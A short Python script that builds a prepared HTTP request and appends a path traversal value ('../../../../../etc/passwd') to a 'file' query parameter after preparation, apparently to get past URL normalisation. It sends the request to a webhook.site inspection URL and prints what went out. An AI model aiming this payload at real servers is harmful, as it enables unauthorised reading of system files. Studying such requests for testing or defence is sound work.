import requests 
from pprint import pprint as pp 

def preparedRequest(url, queryParam):

    # Step 1 - Create a Request object. 
    req = requests.Request("GET", url, headers= {"User-Agent":"FireJackal", "Accept-Encoding":"gzip, deflate, br"}) 

    # Step 2 - Prepare the request 
    prepared_req = req.prepare() 
    prepared_req.url += f"?file={queryParam}"

    # Step 3 - Send the request using the session object.
    with requests.Session() as s:
        resp = s.send(prepared_req)
        print(f'[+] Requested URL: {resp.request.url}')
        pp(f'[+] Headers in the request: {resp.request.headers}', width=45) 

target = 'https://webhook.site/0f0e507e-0d67-4e78-9a25-bd8c54bdd27d'
param = '../../../../../etc/passwd'
preparedRequest(target,param)     